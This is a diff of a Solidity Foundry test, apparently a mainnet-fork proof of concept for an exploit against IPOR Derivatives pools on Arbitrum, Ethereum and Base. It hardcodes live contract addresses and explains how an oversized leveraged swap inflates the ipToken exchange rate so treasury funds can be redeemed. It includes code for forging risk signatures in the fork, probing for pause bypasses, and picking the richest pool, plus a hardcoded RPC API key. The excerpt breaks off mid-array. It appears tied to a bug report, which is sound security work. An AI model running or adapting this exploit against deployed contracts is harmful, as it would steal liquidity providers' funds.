@@ -2,43 +2,67 @@
 pragma solidity 0.8.26;
 
 // ============================================================================
-//  IPOR Derivatives — fork PoC v3
+//  IPOR Derivatives — mainnet-fork PoC  (v3.2)
 //
-//  Bug: settlement (close) clamps trader PnL to collateral, but the SOAP that
-//  feeds AmmLib.getExchangeRate does NOT clamp and is linear in notional.
-//  => an oversized receive-fixed swap (1000x leverage) books a phantom LP
-//     liability over time; ipToken exchange rate inflates; the attacker
-//     redeems ipTokens against real treasury cash.
+//  Bug under test
+//  --------------
+//  Closing a swap clamps the trader's PnL to his collateral
+//  (SwapLogicBaseV1.normalizePnlValue), but the SOAP figure that feeds
+//  AmmLib.getExchangeRate is NOT clamped and is linear in the swap NOTIONAL.
+//  One oversized receive-fixed swap therefore books a phantom LP liability
+//  that grows with time; ipToken redemption price (= LP balance / ipToken
+//  supply) inflates; whoever holds ipTokens redeems them against the real
+//  treasury assets.
 //
-//  Arbitrum One (42161) by default; Ethereum (1) and Base (8453) also wired.
+//  What v3.2 changes vs v3.1
+//  -------------------------
+//  * the live router reverts IPOR_015 (METHOD_PAUSED) on the 90-day open
+//    entry points, so the tenor is now a parameter (TENOR=28|60|90) and every
+//    open selector is checked against router.paused(selector) before use.
+//  * test_3_pause prints the pause state of ALL 18 open entry points plus the
+//    liquidity/close ones, and proves whether the pause can be side-stepped by
+//    calling the open-swap service directly (it cannot: the service reads the
+//    message-signer slot of its own storage, which is empty).
+//  * a second, honest LP is used as the victim: it deposits before the attack
+//    and redeems after it, so the loss is a measured number, not an inference.
+//  * SwapData struct fixed to the real AmmTypes.Swap field order.
 //
-//  Run
-//    cd ~/arc_hedgefun
-//    cp IporFork.t.sol test/
+//  Run (on a machine with foundry + an Arbitrum RPC)
+//  ------------------------------------------------
+//    export ARB_RPC=https://arb-mainnet.g.alchemy.com/v2/KEY
 //    forge test --match-contract IporFork -vv
 //
-//  Knobs (all wad / 18 dec, all optional):
-//    ATK_LP TOTAL LEV DAYS TARGET CHUNKS
-//    e.g.  LEV=1000e18 DAYS=90 TARGET=wstETH forge test --match-contract IporFork --match-test test_1_attack -vv
+//  Individual steps (read the first three before believing the fourth)
+//    forge test --match-contract IporFork --match-test test_2_probe      -vv
+//    forge test --match-contract IporFork --match-test test_3_pause      -vv
+//    forge test --match-contract IporFork --match-test test_4_all_chains -vv
+//    forge test --match-contract IporFork --match-test test_0_recon      -vv
+//    forge test --match-contract IporFork --match-test test_1_attack     -vv
 //
-//  v3.1: swap entry points are arity-specific too — Arbitrum/Base USDC use
-//    openSwapReceiveFixed90daysUsdc(beneficiary, inputAsset, amount, rate,
-//    leverage, risk), Ethereum uses (beneficiary, amount, rate, leverage, risk).
-//    test_2_probe reports which selectors this router actually dispatches.
+//  Knobs (optional, wad unless stated)
+//    TARGET=USDC|wstETH   pick the pool (default: the biggest one by USD)
+//    ATK_LP=<wad>         attacker LP deposit      (default: depth/2)
+//    HONEST=<wad>         victim LP deposit        (default: depth/4)
+//    TOTAL=<wad>          swap collateral          (default: depth/2)
+//    LEV=<wad>            leverage                 (default: 1000e18)
+//    TENOR=28|60|90       swap tenor               (default: 90, falls back if paused)
+//    DAYS=<n>             days held before redeem  (default: tenor days)
+//    CHUNKS=<n>           redemption chunks        (default: 20)
+//    FORK_BLOCK=<n>       pin the fork block
 //
-//  v3 fixes vs v2:
-//    * LP entry point is chain-specific: Arbitrum/Base USDC use
-//      provideLiquidityUsdcToAmmPoolUsdc (v2 called provideLiquidityUsdc
-//      -> router reverts IPOR_012 ROUTER_INVALID_SIGNATURE).
-//    * _depth() uses AmmTreasury.getLiquidityPoolBalance() (the number the
-//      swap engine itself uses), not AmmStorage.liquidityPool.
-//    * treasury read via ammAssetManagement()/maxWithdraw (AmmTreasuryBaseV2
-//      has no getConfiguration()).
-//    * every env knob optional.
+//  Chains: Arbitrum (42161) default, Ethereum (1) and Base (8453) wired.
+//    ARB_RPC / ETH_RPC / BASE_RPC, CHAIN=arb|eth|base
+//
+//  One test-only cheat, disclosed on purpose: risk indicators must be signed by
+//  IPOR's off-chain key. Nobody can forge that key inside a fork, so the test
+//  points the verifier at a key it owns (setMessageSigner, owner-only). In
+//  production the same signed payload is served by IPOR's public API to any
+//  caller, so the attacker needs no privilege there — see REPORT.md.
 // ============================================================================
 
 import {Test, console2} from "forge-std/Test.sol";
 
+/// @dev mirrors AmmTypes.RiskIndicatorsInputs
 struct RiskInputs {
     uint256 maxCollateralRatio;
     uint256 maxCollateralRatioPerLeg;
@@ -48,6 +72,34 @@ struct RiskInputs {
     uint256 demandSpreadFactor;
     uint256 expiration;
     bytes signature;
+}
+
+struct CloseRiskInputs {
+    RiskInputs payFixed;
+    RiskInputs receiveFixed;
+}
+
+/// @dev mirrors AmmTypes.Swap exactly (field order matters for decoding)
+struct SwapData {
+    uint256 id;
+    address buyer;
+    uint256 openTimestamp;
+    uint256 tenor;
+    uint256 idsIndex;
+    uint256 collateral;
+    uint256 notional;
+    uint256 ibtQuantity;
+    uint256 fixedInterestRate;
+    uint256 liquidationDepositAmount;
+    uint256 state;
+}
+
+/// @dev mirrors AmmTypesBaseV1.Balance
+struct AmmBalance {
+    uint256 totalCollateralPayFixed;
+    uint256 totalCollateralReceiveFixed;
+    uint256 liquidityPool;
+    uint256 vault;
 }
 
 interface IERC20Like {
@@ -61,7 +113,7 @@ interface IERC4626Like {
     function asset() external view returns (address);
 }
 
-/// @dev AmmTreasuryBaseV2 getters + legacy AmmTreasury.getConfiguration()
+/// @dev AmmTreasuryBaseV2 public getters (+ legacy getConfiguration fallback)
 interface ITreasury {
     function getLiquidityPoolBalance() external view returns (uint256);
     function ammAssetManagement() external view returns (address);
@@ -71,27 +123,16 @@ interface ITreasury {
         returns (address asset, uint256 decimals, address ammStorage, address assetManagement, address router);
 }
 
-struct SwapData {
-    uint256 id;
-    address buyer;
-    uint256 openTimestamp;
-    uint256 tenor;
-    uint256 direction;
-    uint256 idsIndex;
-    uint256 collateral;
-    uint256 notional;
-    uint256 ibtQuantity;
-    uint256 fixedInterestRate;
-    uint256 wadLiquidationDepositAmount;
-    uint256 state;
+interface IAmmStorageLike {
+    function getBalance() external view returns (AmmBalance memory);
 }
 
 interface IAmmStorageSwap {
     function getSwap(uint8 direction, uint256 swapId) external view returns (SwapData memory);
 }
 
-/// @dev V1 flavour: swaps carry an explicit inputAsset (Arbitrum + Base USDC)
-interface IRouterStableV1 {
+/// @dev direct (non-router) open-swap service — used only to test pause bypass
+interface IOpenSwapDirect {
     function openSwapReceiveFixed90daysUsdc(
         address beneficiary,
         address inputAsset,
@@ -102,55 +143,15 @@ interface IRouterStableV1 {
     ) external returns (uint256);
 }
 
-/// @dev legacy flavour: no inputAsset (Ethereum stable pools)
-interface IRouterLegacy {
-    function openSwapReceiveFixed90daysUsdc(
-        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-    function openSwapReceiveFixed90daysUsdt(
-        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-    function openSwapReceiveFixed90daysDai(
-        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-}
-
-struct CloseRiskInputs {
-    RiskInputs payFixed;
-    RiskInputs receiveFixed;
-}
-
-interface IRouterClose {
-    function closeSwapsUsdc(
-        address beneficiary,
-        uint256[] memory payFixedSwapIds,
-        uint256[] memory receiveFixedSwapIds,
-        CloseRiskInputs calldata ri
-    ) external;
-    function closeSwapsWstEth(
-        address beneficiary,
-        uint256[] memory payFixedSwapIds,
-        uint256[] memory receiveFixedSwapIds,
-        CloseRiskInputs calldata ri
-    ) external;
-}
-
-interface IRouterWstEth {
-    function openSwapReceiveFixed90daysWstEth(
-        address b, address inputAsset, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-}
-
-interface IAmmStorageLike {
-    function getBalance() external view returns (uint256 totalCollateralPayFixed, uint256 totalCollateralReceiveFixed, uint256 liquidityPool, uint256 vault);
-}
-
 interface IRouter {
     function owner() external view returns (address);
     function setMessageSigner(address) external;
     function getIpTokenExchangeRate(address asset) external view returns (uint256);
+    function paused(bytes4 functionSig) external view returns (uint256);
+    function unpause(bytes4[] calldata) external;
+    function pause(bytes4[] calldata) external;
 
-    // ---- liquidity: legacy (Ethereum stable pools) vs V1 (Arbitrum/Base USDC)
+    // liquidity (entry point differs per chain)
     function provideLiquidityUsdc(address beneficiary, uint256 amount) external;
     function provideLiquidityUsdcToAmmPoolUsdc(address beneficiary, uint256 amount) external;
     function provideLiquidityUsdt(address beneficiary, uint256 amount) external;
@@ -162,23 +163,25 @@ interface IRouter {
     function redeemFromAmmPoolDai(address beneficiary, uint256 ipAmount) external;
     function redeemFromAmmPoolWstEth(address beneficiary, uint256 ipAmount) external;
 
-    // ---- swaps
-    function openSwapReceiveFixed90daysUsdc(
-        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-    function openSwapReceiveFixed90daysUsdt(
-        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-    function openSwapReceiveFixed90daysDai(
-        address b, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
-    function openSwapReceiveFixed90daysWstEth(
-        address b, address inputAsset, uint256 totalAmount, uint256 acceptable, uint256 leverage, RiskInputs calldata ri
-    ) external returns (uint256);
+    function closeSwapsUsdc(
+        address beneficiary,
+        uint256[] memory payFixedSwapIds,
+        uint256[] memory receiveFixedSwapIds,
+        CloseRiskInputs calldata ri
+    ) external;
+
+    function closeSwapsWstEth(
+        address beneficiary,
+        uint256[] memory payFixedSwapIds,
+        uint256[] memory receiveFixedSwapIds,
+        CloseRiskInputs calldata ri
+    ) external;
 }
 
 contract IporForkTest is Test {
-    string constant RPC = "https://arb-mainnet.g.alchemy.com/v2/WqhCk5T_nDcejq-szWp1M";
+    // Alchemy demo key used earlier by the operator; override with ARB_RPC.
+    string constant RPC_ARB_FALLBACK =
+        "https://arb-mainnet.g.alchemy.com/v2/WqhCk5T_nDcejq-szWp1M";
     uint256 constant PRICE_ETH = 3850e18; // conservative wstETH/ETH ~1.06 x ETH 3600
 
     address constant ARB_USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
@@ -192,14 +195,17 @@ contract IporForkTest is Test {
     uint8 constant K_STABLE = 0;
     uint8 constant K_WSTETH = 1;
 
-    /// @dev LP entry point flavour
-    uint8 constant LP_LEGACY = 0; // provideLiquidityUsdc / type(uint256).max == 0
-    uint8 constant LP_USDC_V1 = 1; // provideLiquidityUsdcToAmmPoolUsdc
-    uint8 constant LP_WSTETH = 2; // provideLiquidityWstEth
+    uint8 constant LP_LEGACY = 0; // Ethereum stable pools
+    uint8 constant LP_USDC_V1 = 1; // Arbitrum / Base USDC
+    uint8 constant LP_WSTETH = 2;
+
+    uint8 constant DIR_PAY_FIXED = 0; // AmmTypes.SwapDirection.PAY_FIXED_RECEIVE_FLOATING
+    uint8 constant DIR_RECEIVE_FIXED = 1; // AmmTypes.SwapDirection.PAY_FLOATING_RECEIVE_FIXED
 
     struct Pool {
         string name;
         string tag;
+        string assetTag; // "Usdc" / "WstEth" / "Usdt" / "Dai"
         address asset;
         address ipToken;
         address treasury;
@@ -207,20 +213,20 @@ contract IporForkTest is Test {
         uint8 decimals;
         uint8 lpStyle;
         address ammStorage;
-        address poolsService; // direct entry point, used only if the router path fails
+        address poolsService;
         address openSwapService;
     }
 
     IRouter router;
     uint256 signerPk = 0xA11CE;
     address signer;
+
+    // actors
     address attacker = address(0xA77ACC);
+    address honest = address(0x40E57);
 
     function setUp() public {
-        string memory rpc = RPC;
-        try vm.envString("ARB_RPC") returns (string memory r) {
-            rpc = r;
-        } catch {}
+        string memory rpc = _pickRpc();
         uint256 fb = _envOr("FORK_BLOCK", 0);
         if (fb > 0) {
             vm.createSelectFork(rpc, fb);
@@ -230,47 +236,69 @@ contract IporForkTest is Test {
         signer = vm.addr(signerPk);
     }
 
+    // ------------------------------------------------------------- chain set-up
+    function _pickRpc() internal view returns (string memory) {
+        (string memory direct, bool hasDirect) = _envS("RPC_URL");
+        if (hasDirect) return direct;
+
+        (string memory c, bool hasChain) = _envS("CHAIN");
+        if (hasChain) {
+            if (_eq(c, "eth") || _eq(c, "ethereum") || _eq(c, "mainnet")) {
+                (string memory e, bool he) = _envS("ETH_RPC");
+                require(he, "CHAIN=eth needs ETH_RPC");
+                return e;
+            }
+            if (_eq(c, "base")) {
+                (string memory b, bool hb) = _envS("BASE_RPC");
+                require(hb, "CHAIN=base needs BASE_RPC");
+                return b;
+            }
+            (string memory a, bool ha) = _envS("ARB_RPC");
+            require(ha, "CHAIN=arb needs ARB_RPC");
+            return a;
+        }
+
+        (string memory arb, bool hArb) = _envS("ARB_RPC");
+        if (hArb) return arb;
+        (string memory eth, bool hEth) = _envS("ETH_RPC");
+        if (hEth) return eth;
+        (string memory base, bool hBase) = _envS("BASE_RPC");
+        if (hBase) return base;
+        return RPC_ARB_FALLBACK;
+    }
+
     function _pools() internal returns (Pool[] memory p) {
         if (block.chainid == 42161) {
             router = IRouter(0x760Fa0aB719c4067D3A8d4727Cf07E8f3Bf118db);
             p = new Pool[](2);
-            p[0] = Pool("USDC  / Arbitrum", "USDC", ARB_USDC, 0x485cAC13E6492CcF4d47764b0E4e07b5272B0167,
-                0x9324d39B29c85440cadd2202E4703E6f5d1e98F9, K_STABLE, 6, LP_USDC_V1,
-                0x52395372f2355491bC823d752bdb347807864308,
-                0xc08610f885C606e622C910D902356257998D6217, 0x5D9094baDc927b82a78BA095A5BC394F166aA27b);
-            p[1] = Pool("wstETH/ Arbitrum", "wstETH", ARB_WSTETH, 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C,
-                0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D, K_WSTETH, 18, LP_WSTETH,
-                0x326804339eC2a210e5f9246F4959aE50961c5C28,
-                0x2e53879feb7F9BC8E97d1bcc848356F781402b6c, 0x7138B130F255fa4B65dFE6DEA9ade89dBF1E6461);
+            // solhint-disable-next-line max-line-length
+            p[0] = Pool("USDC  / Arbitrum", "USDC", "Usdc", ARB_USDC, 0x485cAC13E6492CcF4d47764b0E4e07b5272B0167, 0x9324d39B29c85440cadd2202E4703E6f5d1e98F9, K_STABLE, 6, LP_USDC_V1, 0x52395372f2355491bC823d752bdb347807864308, 0xc08610f885C606e622C910D902356257998D6217, 0x5D9094baDc927b82a78BA095A5BC394F166aA27b);
+            p[1] = Pool("wstETH/ Arbitrum", "wstETH", "WstEth", ARB_WSTETH, 0xbDa4b3e17a9B0ecb811E68c6f08907156CBa503C, 0xBd013Ea2E01C2Ab3462dd67e9C83aa3834882A5D, K_WSTETH, 18, LP_WSTETH, 0x326804339eC2a210e5f9246F4959aE50961c5C28, 0x2e53879feb7F9BC8E97d1bcc848356F781402b6c, 0x7138B130F255fa4B65dFE6DEA9ade89dBF1E6461);
         } else if (block.chainid == 1) {
             router = IRouter(0x16d104009964e694761C0bf09d7Be49B7E3C26fd);
             p = new Pool[](3);
-            p[0] = Pool("USDC  / Ethereum", "USDC", ETH_USDC, 0x7c0e72f431FD69560D951e4C04A4de3657621a88,
-                0x137000352B4ed784e8fa8815d225c713AB2e7Dc9, K_STABLE, 6, LP_LEGACY,
-                address(0), address(0), address(0));
-            p[1] = Pool("USDT  / Ethereum", "USDT", ETH_USDT, 0x9Bd2177027edEE300DC9F1fb88F24DB6e5e1edC6,
-                0x28BC58e600eF718B9E97d294098abecb8c96b687, K_STABLE, 6, LP_LEGACY,
-                address(0), address(0), address(0));
-            p[2] = Pool("DAI   / Ethereum", "DAI", ETH_DAI, 0x8537b194BFf354c4738E9F3C81d67E3371DaDAf8,
-                0xEd7d74AA7eB1f12F83dA36DFaC1de2257b4e7523, K_STABLE, 18, LP_LEGACY,
-                address(0), address(0), address(0));
+            p[0] = Pool("USDC  / Ethereum", "USDC", "Usdc", ETH_USDC, 0x7c0e72f431FD69560D951e4C04A4de3657621a88, 0x137000352B4ed784e8fa8815d225c713AB2e7Dc9, K_STABLE, 6, LP_LEGACY, address(0), address(0), address(0));
+            p[1] = Pool("USDT  / Ethereum", "USDT", "Usdt", ETH_USDT, 0x9Bd2177027edEE300DC9F1fb88F24DB6e5e1edC6, 0x28BC58e600eF718B9E97d294098abecb8c96b687, K_STABLE, 6, LP_LEGACY, address(0), address(0), address(0));
+            p[2] = Pool("DAI   / Ethereum", "DAI", "Dai", ETH_DAI, 0x8537b194BFf354c4738E9F3C81d67E3371DaDAf8, 0xEd7d74AA7eB1f12F83dA36DFaC1de2257b4e7523, K_STABLE, 18, LP_LEGACY, address(0), address(0), address(0));
         } else if (block.chainid == 8453) {
             router = IRouter(0x21d337eBF86E584e614ecC18A2B1144D3C375918);
             p = new Pool[](2);
-            p[0] = Pool("USDC  / Base", "USDC", BASE_USDC, 0x4AEE7072AC1a49A3F84D0A95e32F3B7D1C97fB30,
-                0x1AbA7a3C3bec8139B10a4807087084064A454a24, K_STABLE, 6, LP_USDC_V1,
-                address(0),
-                0x786AFBbb9876b193F8F01B04A2c08861551d02d0, 0xdF884ccEf3F18b107e0B9423aaE3b605461bB54d);
-            p[1] = Pool("wstETH/ Base", "wstETH", BASE_WSTETH, 0xff7907CDCA84DB03f09702A4A49C262908AF48Af,
-                0x09388e18d5C331449C6eF636726dD1fd007b8DDf, K_WSTETH, 18, LP_WSTETH,
-                address(0),
-                0x0eb64F28E54a1c5F5aD98b54F951496d9A330887, 0xFbE094Bcc8731fa45Eb88850592248e5D6aC9472);
+            p[0] = Pool("USDC  / Base", "USDC", "Usdc", BASE_USDC, 0x4AEE7072AC1a49A3F84D0A95e32F3B7D1C97fB30, 0x1AbA7a3C3bec8139B10a4807087084064A454a24, K_STABLE, 6, LP_USDC_V1, address(0), 0x786AFBbb9876b193F8F01B04A2c08861551d02d0, 0xdF884ccEf3F18b107e0B9423aaE3b605461bB54d);
+            p[1] = Pool("wstETH/ Base", "wstETH", "WstEth", BASE_WSTETH, 0xff7907CDCA84DB03f09702A4A49C262908AF48Af, 0x09388e18d5C331449C6eF636726dD1fd007b8DDf, K_WSTETH, 18, LP_WSTETH, address(0), 0x0eb64F28E54a1c5F5aD98b54F951496d9A330887, 0xFbE094Bcc8731fa45Eb88850592248e5D6aC9472);
         } else {
             revert("fork Arbitrum (42161), Ethereum (1) or Base (8453)");
         }
     }
 
-    // ---------------------------------------------------------------- helpers
+    // ----------------------------------------------------------------- helpers
+    function _eq(string memory a, string memory b) internal pure returns (bool) {
+        return keccak256(bytes(a)) == keccak256(bytes(b));
+    }
+
+    function _sel(string memory s) internal pure returns (bytes4) {
+        return bytes4(keccak256(bytes(s)));
+    }
+
     function _wad(uint256 a, uint8 d) internal pure returns (uint256) {
         return d == 18 ? a : a * 10 ** (18 - d);
     }
@@ -287,7 +315,48 @@ contract IporForkTest is Test {
         return _isEth(p.asset) ? (wad * PRICE_ETH) / 1e18 : wad;
     }
 
-    /// @dev idle cash in the treasury + vault assets, both as wad
+    /// @dev forge-version-proof env readers (try/catch instead of envExists)
+    function _envU(string memory k) internal view returns (uint256 v, bool ok) {
+        try vm.envUint(k) returns (uint256 x) {
+            return (x, true);
+        } catch {
+            return (0, false);
+        }
+    }
+
+    function _envS(string memory k) internal view returns (string memory v, bool ok) {
+        try vm.envString(k) returns (string memory x) {
+            return (x, true);
+        } catch {
+            return ("", false);
+        }
+    }
+
+    function _envOr(string memory k, uint256 def) internal view returns (uint256 v) {
+        (uint256 x, bool ok) = _envU(k);
+        v = ok ? x : def;
+    }
+
+    function _logReason(bytes memory ret) internal pure {
+        if (ret.length < 4) {
+            console2.log("    (no revert data)");
+        } else {
+            bytes4 sig = bytes4(ret);
+            console2.logBytes4(sig);
+            if (sig == bytes4(keccak256("IPOR_012"))) console2.log("    IPOR_012 = ROUTER_INVALID_SIGNATURE");
+            else if (sig == bytes4(keccak256("IPOR_015"))) console2.log("    IPOR_015 = METHOD_PAUSED");
+            else if (sig == bytes4(keccak256("IPOR_014"))) console2.log("    IPOR_014 = PAUSED (global)");
+            else if (sig == bytes4(keccak256("IPOR_403"))) console2.log("    IPOR_403 = RISK_INDICATORS_SIGNATURE_INVALID");
+            else if (sig == bytes4(keccak256("IPOR_409"))) console2.log("    IPOR_409 = RISK_INDICATORS_EXPIRED");
+            else if (ret.length >= 4) {
+                bytes memory str = new bytes(ret.length - 4);
+                for (uint256 i; i < str.length; i++) str[i] = ret[i + 4];
+                console2.log("   ", string(str));
+            }
+        }
+    }
+
+    /// @dev idle cash + asset-manager assets of the treasury, both as wad
     function _cash(Pool memory p) internal view returns (uint256 idleWad, uint256 vaultWad) {
         idleWad = _wad(IERC20Like(p.asset).balanceOf(p.treasury), p.decimals);
         address am;
@@ -305,382 +374,103 @@ contract IporForkTest is Test {
         }
     }
 
-    /// @dev LP balance (wad) exactly as the swap engine sees it.
+    /// @dev LP balance exactly as the swap engine sees it (wad).
     function _depth(Pool memory p) internal view returns (uint256 d, string memory src) {
         try ITreasury(p.treasury).getLiquidityPoolBalance() returns (uint256 v) {
             return (v, "getLiquidityPoolBalance");
         } catch {}
-        try ITreasury(p.treasury).getConfiguration() returns (address, uint256, address st, address, address) {
-            if (st != address(0)) {
-                try IAmmStorageLike(st).getBalance() returns (uint256, uint256, uint256 lp, uint256) {
-                    if (lp > 0) return (lp, "AmmStorage.liquidityPool");
-                } catch {}
-            }
-        } catch {}
+        if (p.ammStorage != address(0)) {
+            try IAmmStorageLike(p.ammStorage).getBalance() returns (AmmBalance memory b) {
+                if (b.liquidityPool > 0) return (b.liquidityPool, "AmmStorage.liquidityPool");
+            } catch {}
+        }
         try router.getIpTokenExchangeRate(p.asset) returns (uint256 rate) {
             d = (rate * IERC20Like(p.ipToken).totalSupply()) / 1e18;
             src = "rate*supply";
         } catch {}
     }
 
+    function _rate(Pool memory p) internal view returns (uint256) {
+        try router.getIpTokenExchangeRate(p.asset) returns (uint256 r) {
+            return r;
+        } catch {
+            return 0;
+        }
+    }
+
     function _provideSel(Pool memory p) internal pure returns (bytes4) {
         if (p.lpStyle == LP_WSTETH) return IRouter.provideLiquidityWstEth.selector;
         if (p.lpStyle == LP_USDC_V1) return IRouter.provideLiquidityUsdcToAmmPoolUsdc.selector;
-        if (p.asset == ETH_USDT) return IRouter.provideLiquidityUsdt.selector;
-        if (p.asset == ETH_DAI) return IRouter.provideLiquidityDai.selector;
+        if (_eq(p.assetTag, "Usdt")) return IRouter.provideLiquidityUsdt.selector;
+        if (_eq(p.assetTag, "Dai")) return IRouter.provideLiquidityDai.selector;
         return IRouter.provideLiquidityUsdc.selector;
     }
 
     function _redeemSel(Pool memory p) internal pure returns (bytes4) {
         if (p.kind == K_WSTETH) return IRouter.redeemFromAmmPoolWstEth.selector;
-        if (p.asset == ETH_USDT) return IRouter.redeemFromAmmPoolUsdt.selector;
-        if (p.asset == ETH_DAI) return IRouter.redeemFromAmmPoolDai.selector;
+        if (_eq(p.assetTag, "Usdt")) return IRouter.redeemFromAmmPoolUsdt.selector;
+        if (_eq(p.assetTag, "Dai")) return IRouter.redeemFromAmmPoolDai.selector;
         return IRouter.redeemFromAmmPoolUsdc.selector;
     }
 
-    /// @dev variant 0 = V1 flavour (beneficiary, inputAsset, amount, rate, leverage, risk)
-    ///      variant 1 = legacy flavour (beneficiary, amount, rate, leverage, risk)
-    function _openCalldata(
-        Pool memory p,
-        uint8 variant,
-        uint256 amt,
-        uint256 lev,
-        RiskInputs memory ri
-    ) internal view returns (bytes memory) {
-        if (p.kind == K_WSTETH) {
-            return
-                abi.encodeWithSelector(
-                    IRouterWstEth.openSwapReceiveFixed90daysWstEth.selector, attacker, p.asset, amt, 0, lev, ri
-                );
-        }
-        if (variant == 0) {
-            return
-                abi.encodeWithSelector(
-                    IRouterStableV1.openSwapReceiveFixed90daysUsdc.selector, attacker, p.asset, amt, 0, lev, ri
-                );
-        }
-        bytes4 sel = p.asset == ETH_USDT
-            ? IRouterLegacy.openSwapReceiveFixed90daysUsdt.selector
-            : p.asset == ETH_DAI
-                ? IRouterLegacy.openSwapReceiveFixed90daysDai.selector
-                : IRouterLegacy.openSwapReceiveFixed90daysUsdc.selector;
-        return abi.encodeWithSelector(sel, attacker, amt, 0, lev, ri);
+    function _tenorTag(uint256 tenorIdx) internal pure returns (string memory) {
+        if (tenorIdx == 0) return "28days";
+        if (tenorIdx == 1) return "60days";
+        return "90days";
     }
 
-    /// @dev digest layout from RiskIndicatorsValidatorLib.hashRiskIndicatorsInputs
+    /// @dev selector of openSwapReceiveFixed<T>days<Asset>(...)
+    ///      withInputAsset = true  -> V1 flavour (Arbitrum / Base)
+    ///      withInputAsset = false -> legacy flavour (Ethereum)
+    function _openSel(
+        string memory assetTag,
+        uint256 tenorIdx,
+        bool withInputAsset,
+        uint256 dir
+    ) internal pure returns (bytes4) {
+        string memory head = string.concat(
+            "openSwap",
+            dir == DIR_RECEIVE_FIXED ? "ReceiveFixed" : "PayFixed",
+            _tenorTag(tenorIdx),
+            assetTag,
+            "("
+        );
+        string memory tail = withInputAsset
+            ? "address,address,uint256,uint256,uint256,(uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes))"
+            : "address,uint256,uint256,uint256,(uint256,uint256,uint256,int256,uint256,uint256,uint256,bytes))";
+        return _sel(string.concat(head, tail));
+    }
+
+    function _isPaused(bytes4 sel) internal view returns (bool) {
+        try router.paused(sel) returns (uint256 v) {
+            return v != 0;
+        } catch {
+            return false;
+        }
+    }
+
+    /// @dev signature layout from RiskIndicatorsValidatorLib.hashRiskIndicatorsInputs
     function _sign(RiskInputs memory r, address asset, uint256 tenor, uint256 dir) internal view returns (bytes memory) {
         bytes32 digest = keccak256(
             abi.encodePacked(
-                r.maxCollateralRatio, r.maxCollateralRatioPerLeg, r.maxLeveragePerLeg, r.baseSpreadPerLeg,
-                r.fixedRateCapPerLeg, r.demandSpreadFactor, r.expiration, asset, tenor, dir
+                r.maxCollateralRatio,
+                r.maxCollateralRatioPerLeg,
+                r.maxLeveragePerLeg,
+                r.baseSpreadPerLeg,
+                r.fixedRateCapPerLeg,
+                r.demandSpreadFactor,
+                r.expiration,
+                asset,
+                tenor,
+                dir
             )
         );
         (uint8 v, bytes32 rr, bytes32 s) = vm.sign(signerPk, digest);
         return abi.encodePacked(rr, s, v);
     }
 
-    function _envOr(string memory k, uint256 def) internal view returns (uint256) {
-        try vm.envUint(k) returns (uint256 v) {
-            return v;
-        } catch {
-            return def;
-        }
-    }
-
-    /// @dev pretty-print a revert payload (Error(string) or bare selector)
-    function _logReason(bytes memory ret) internal pure {
-        if (ret.length > 68) {
-            bytes memory s = new bytes(ret.length - 68);
-            for (uint256 i; i < s.length; i++) s[i] = ret[i + 68];
-            console2.log("  revert:", string(s));
-        } else if (ret.length >= 4) {
-            console2.log("  revert selector:");
-            console2.logBytes4(bytes4(ret));
-        }
-    }
-
-    /// @dev router first (real user path), direct service as a diagnostic fallback
-    function _callPool(
-        address fallbackTarget,
-        bytes memory data
-    ) internal returns (bool ok, bytes memory ret, string memory via) {
-        (ok, ret) = address(router).call(data);
-        via = "router";
-        if (ok || fallbackTarget == address(0)) return (ok, ret, via);
-        (ok, ret) = fallbackTarget.call(data);
-        via = ok ? "direct-service" : "router+service-failed";
-    }
-
-    function _rate(Pool memory p) internal view returns (uint256 r) {
-        try router.getIpTokenExchangeRate(p.asset) returns (uint256 v) {
-            r = v;
-        } catch {}
-    }
-
-    function _pick(Pool[] memory ps) internal view returns (uint256 idx, uint256 bestUsd) {
-        for (uint256 i; i < ps.length; i++) {
-            (uint256 idle, uint256 vault) = _cash(ps[i]);
-            (uint256 d,) = _depth(ps[i]);
-            uint256 liquid = idle + vault;
-            uint256 usd = _usd(ps[i], liquid < d ? liquid : d);
-            if (usd > bestUsd) {
-                bestUsd = usd;
-                idx = i;
-            }
-        }
-    }
-
-    // ---------------------------------------------------------------- 1. recon
-    function test_0_recon() public {
-        Pool[] memory ps = _pools();
-        console2.log("chainid", block.chainid);
-        console2.log("block", block.number);
-        console2.log("router owner", router.owner());
-        console2.log("");
-
-        for (uint256 i; i < ps.length; i++) {
-            Pool memory p = ps[i];
-            (uint256 idle, uint256 vault) = _cash(p);
-            (uint256 depth, string memory src) = _depth(p);
-
-            console2.log(p.name);
-            console2.log("  treasury idle (wad)   ", idle);
-            console2.log("  asset manager  (wad)  ", vault);
-            console2.log("  LP balance     (wad)  ", depth);
-            console2.log("    source:", src);
-            console2.log("  ipToken supply        ", IERC20Like(p.ipToken).totalSupply());
-            console2.log("  exchange rate         ", _rate(p));
-            console2.log("  liquid assets (wad)   ", idle + vault);
-            console2.log("  -> USD ceiling        ", _usd(p, (idle + vault) < depth ? (idle + vault) : depth));
-            console2.log("");
-        }
-
-        (uint256 idx, uint256 usd) = _pick(ps);
-        console2.log("== richest pool:", ps[idx].name);
-        console2.log("== ceiling ~USD", usd);
-    }
-
-    // ------------------------------------------------- 1b. router selector probe
-    /// @dev A selector the router does not know reverts IPOR_012 *before* decoding
-    ///      arguments, so "revert != IPOR_012" means the entry point exists.
-    function test_2_probe() public {
-        _pools();
-        bytes4[8] memory sels = [
-            IRouterStableV1.openSwapReceiveFixed90daysUsdc.selector,
-            IRouterLegacy.openSwapReceiveFixed90daysUsdc.selector,
-            IRouterWstEth.openSwapReceiveFixed90daysWstEth.selector,
-            IRouterClose.closeSwapsUsdc.selector,
-            IRouterClose.closeSwapsWstEth.selector,
